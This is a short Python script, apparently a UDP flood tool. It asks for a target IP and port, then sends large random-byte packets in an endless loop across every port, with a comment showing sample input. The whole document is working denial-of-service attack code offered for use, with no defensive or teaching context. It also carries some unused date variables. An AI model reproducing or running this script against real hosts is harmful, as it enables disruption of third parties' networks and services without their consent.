
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = input("IP Target : ")
port = int(input("Port : "))

print ("Starting in 5 seconds.")
time.sleep(5)

sent = 0
while True:
  sock.sendto(bytes, (ip,port))
  sent = sent + 1
  port = port + 1
  print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
  if port == 65534:
    port = 1


# Output:

'''
IP Target : 127.0.0.1
Port : 5000
'''
